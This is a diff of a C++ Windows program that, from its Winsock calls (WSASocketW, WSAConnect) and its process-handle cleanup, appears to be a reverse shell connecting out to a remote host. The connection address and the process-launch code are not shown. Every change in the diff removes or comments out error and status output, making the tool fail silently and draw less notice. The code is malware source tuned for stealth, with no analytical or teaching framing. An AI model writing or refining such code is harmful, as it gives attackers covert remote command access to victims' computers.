@@ -23,7 +23,7 @@ int main(int argc, char *argv[])
 	err = WSAStartup(wVersion, &wsaData);
 
 	if (err != 0) {
-		cout << "[-] WSAinit failed !!\n";
+		//cout << "[-] WSAinit failed !!\n";
 		WSACleanup();
 		return -1;
 	}
@@ -32,7 +32,7 @@ int main(int argc, char *argv[])
 	clientSocket = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, NULL);
 
 	if (clientSocket == INVALID_SOCKET) {
-		cout << "[-] SocketInit Failed !!\n";
+		//cout << "[-] SocketInit Failed !!\n";
 		closesocket(clientSocket);
 		WSACleanup();
 	}
@@ -46,7 +46,7 @@ int main(int argc, char *argv[])
 	conn = WSAConnect(clientSocket, (SOCKADDR *)&saddr, sizeof(saddr), NULL, NULL, NULL, NULL);
 
 	if (conn == SOCKET_ERROR) {
-		cout << "[-] Failed to connect !!\n";
+		//cout << "[-] Failed to connect !!\n";
 		closesocket(clientSocket);
 		WSACleanup();
 		return -1;
@@ -71,7 +71,7 @@ int main(int argc, char *argv[])
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 	}
-	cout << GetLastError();
+	
 	closesocket(clientSocket);
 	WSACleanup();
 
